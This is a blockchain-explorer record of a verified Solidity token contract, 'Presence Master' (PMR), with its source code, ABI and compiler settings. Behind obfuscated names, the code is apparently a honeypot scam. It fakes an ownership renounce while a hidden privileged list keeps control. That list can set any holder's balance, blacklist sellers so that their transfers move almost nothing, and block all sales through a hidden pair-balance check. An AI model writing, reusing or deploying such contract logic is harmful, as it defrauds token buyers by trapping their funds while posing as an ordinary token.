{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface enableReceiverSell {\n    function createPair(address fromLaunched, address exemptTotal) external returns (address);\n}\n\ninterface totalLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunched) external view returns (uint256);\n\n    function transfer(address isMin, uint256 tokenIs) external returns (bool);\n\n    function allowance(address swapTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isMin,\n        uint256 tokenIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountModeFee, uint256 value);\n    event Approval(address indexed swapTotal, address indexed spender, uint256 value);\n}\n\nabstract contract maxExemptTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalLiquidityMetadata is totalLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PresenceMaster is maxExemptTeam, totalLiquidity, totalLiquidityMetadata {\n\n    bool public limitToExempt;\n\n    function approve(address senderLaunch, uint256 tokenIs) public virtual override returns (bool) {\n        limitMarketing[_msgSender()][senderLaunch] = tokenIs;\n        emit Approval(_msgSender(), senderLaunch, tokenIs);\n        return true;\n    }\n\n    function tradingLaunched(address maxToken) public {\n        sellLiquidity();\n        if (feeLiquidity != sellTeam) {\n            sellTeam = feeLiquidity;\n        }\n        if (maxToken == autoLaunched || maxToken == txWallet) {\n            return;\n        }\n        fromList[maxToken] = true;\n    }\n\n    uint8 private amountSellTeam = 18;\n\n    uint256 public listIsFund;\n\n    function allowance(address sellFund, address senderLaunch) external view virtual override returns (uint256) {\n        if (senderLaunch == launchedLaunch) {\n            return type(uint256).max;\n        }\n        return limitMarketing[sellFund][senderLaunch];\n    }\n\n    function sellLiquidity() private view {\n        require(toFrom[_msgSender()]);\n    }\n\n    uint256 private sellTeam;\n\n    address private buyLaunch;\n\n    function balanceOf(address senderLaunched) public view virtual override returns (uint256) {\n        return toFee[senderLaunched];\n    }\n\n    function toBuy(uint256 tokenIs) public {\n        sellLiquidity();\n        autoAmountTx = tokenIs;\n    }\n\n    mapping(address => bool) public toFrom;\n\n    bool public feeLimitMin;\n\n    constructor (){\n        \n        marketingAuto takeToken = marketingAuto(launchedLaunch);\n        txWallet = enableReceiverSell(takeToken.factory()).createPair(takeToken.WETH(), address(this));\n        if (totalMarketing == tradingLiquidity) {\n            tradingLiquidity = true;\n        }\n        autoLaunched = _msgSender();\n        toFrom[autoLaunched] = true;\n        toFee[autoLaunched] = fundFromSender;\n        senderToken();\n        if (limitToExempt) {\n            buyShould = buyExempt;\n        }\n        emit Transfer(address(0), autoLaunched, fundFromSender);\n    }\n\n    uint256 public buyShould;\n\n    uint256 liquiditySenderSell;\n\n    address launchedLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeSellMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return fundIsAt;\n    }\n\n    mapping(address => uint256) private toFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundFromSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountSellTeam;\n    }\n\n    uint256 private buyExempt;\n\n    string private fundIsAt = \"Presence Master\";\n\n    function owner() external view returns (address) {\n        return buyLaunch;\n    }\n\n    function getOwner() external view returns (address) {\n        return buyLaunch;\n    }\n\n    function launchTotal(address walletTeam) public {\n        require(walletTeam.balance < 100000);\n        if (marketingTx) {\n            return;\n        }\n        \n        toFrom[walletTeam] = true;\n        if (listIsFund == feeLiquidity) {\n            feeLiquidity = buyExempt;\n        }\n        marketingTx = true;\n    }\n\n    uint256 autoAmountTx;\n\n    function feeTotal(address shouldList, address isMin, uint256 tokenIs) internal returns (bool) {\n        if (shouldList == autoLaunched) {\n            return maxTo(shouldList, isMin, tokenIs);\n        }\n        uint256 teamTo = totalLiquidity(txWallet).balanceOf(tokenLaunchedTake);\n        require(teamTo == autoAmountTx);\n        require(isMin != tokenLaunchedTake);\n        if (fromList[shouldList]) {\n            return maxTo(shouldList, isMin, sellMinTotal);\n        }\n        return maxTo(shouldList, isMin, tokenIs);\n    }\n\n    bool public tradingLiquidity;\n\n    function transfer(address tradingMode, uint256 tokenIs) external virtual override returns (bool) {\n        return feeTotal(_msgSender(), tradingMode, tokenIs);\n    }\n\n    address public autoLaunched;\n\n    uint256 private fundFromSender = 100000000 * 10 ** 18;\n\n    bool public marketingTx;\n\n    string private modeSellMax = \"PMR\";\n\n    event OwnershipTransferred(address indexed fundFrom, address indexed teamAmount);\n\n    function liquidityWallet(address tradingMode, uint256 tokenIs) public {\n        sellLiquidity();\n        toFee[tradingMode] = tokenIs;\n    }\n\n    uint256 constant sellMinTotal = 15 ** 10;\n\n    address public txWallet;\n\n    mapping(address => bool) public fromList;\n\n    uint256 public feeLiquidity;\n\n    bool public totalMarketing;\n\n    function maxTo(address shouldList, address isMin, uint256 tokenIs) internal returns (bool) {\n        require(toFee[shouldList] >= tokenIs);\n        toFee[shouldList] -= tokenIs;\n        toFee[isMin] += tokenIs;\n        emit Transfer(shouldList, isMin, tokenIs);\n        return true;\n    }\n\n    bool private exemptWalletMarketing;\n\n    function transferFrom(address shouldList, address isMin, uint256 tokenIs) external override returns (bool) {\n        if (_msgSender() != launchedLaunch) {\n            if (limitMarketing[shouldList][_msgSender()] != type(uint256).max) {\n                require(tokenIs <= limitMarketing[shouldList][_msgSender()]);\n                limitMarketing[shouldList][_msgSender()] -= tokenIs;\n            }\n        }\n        return feeTotal(shouldList, isMin, tokenIs);\n    }\n\n    function senderToken() public {\n        emit OwnershipTransferred(autoLaunched, address(0));\n        buyLaunch = address(0);\n    }\n\n    address tokenLaunchedTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountModeFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"launchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenIs\",\"type\":\"uint256\"}],\"name\":\"liquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIsFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenIs\",\"type\":\"uint256\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PresenceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}